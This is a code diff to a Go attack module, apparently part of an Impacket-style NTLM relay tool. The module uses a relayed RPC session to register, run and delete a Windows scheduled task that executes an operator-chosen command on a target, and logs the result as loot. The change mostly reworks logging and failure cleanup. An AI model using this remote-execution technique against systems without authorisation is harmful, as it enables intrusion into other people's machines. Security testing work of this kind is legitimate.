@@ -58,7 +58,8 @@ func (a *RPCTschExecAttack) Run(session interface{}, config *Config) error {
 		return fmt.Errorf("no command specified (-c flag)")
 	}
 
-	log.Printf("[*] Executing command via Task Scheduler (RPC relay)...")
+	rl := &runLog{}
+	rl.Printf("[*] Executing command via Task Scheduler (RPC relay)...")
 
 	// The dcerpc.Client is already bound to ITaskSchedulerService from the BIND relay
 	ts := tsch.NewTaskScheduler(rpcSession.Client)
@@ -70,7 +71,7 @@ func (a *RPCTschExecAttack) Run(session interface{}, config *Config) error {
 	taskXML := buildTaskXML(config.Command)
 
 	if build.Debug {
-		log.Printf("[D] RPCTschExec: registering task %s", taskName)
+		rl.Printf("[D] RPCTschExec: registering task %s", taskName)
 	}
 
 	// Register task
@@ -79,28 +80,29 @@ func (a *RPCTschExecAttack) Run(session interface{}, config *Config) error {
 		return fmt.Errorf("register task: %v", err)
 	}
 
-	log.Printf("[*] Task %s registered successfully", actualPath)
+	rl.Printf("[*] Task %s registered successfully", actualPath)
 
-	// Run task
+	// Run task — over an RPC-only relay there is no share access to read the
+	// command output back, so a successful Run is the success criteria.
 	if err := ts.Run(actualPath); err != nil {
-		log.Printf("[-] Task run returned: %v", err)
-	} else {
-		log.Printf("[*] Task executed")
+		rl.Printf("[-] Task %s failed to run: %v", actualPath, err)
+		ts.Delete(actualPath)
+		return fmt.Errorf("run task: %v", err)
 	}
+	rl.Printf("[*] Task executed")
 
 	// Wait briefly for execution, then clean up (matches Impacket behavior)
 	time.Sleep(2 * time.Second)
 
 	// Delete task
 	if err := ts.Delete(actualPath); err != nil {
-		log.Printf("[-] Warning: failed to delete task %s: %v", actualPath, err)
+		rl.Printf("[-] Warning: failed to delete task %s: %v", actualPath, err)
 	} else {
-		log.Printf("[*] Task %s deleted", actualPath)
+		rl.Printf("[*] Task %s deleted", actualPath)
 	}
 
-	openCommandLoot(config, hostFromAddr(rpcSession.Target), "rpctschexec", config.Command)
-	commandLootf("[+] Command executed via Task Scheduler (RPC): %s", config.Command)
-	closeCommandLoot()
+	rl.Printf("[+] Command executed via Task Scheduler (RPC): %s (output not captured — RPC-only relay)", config.Command)
+	rl.Flush(config, hostFromAddr(rpcSession.Target), "rpctschexec", config.Command)
 
 	return nil
 }
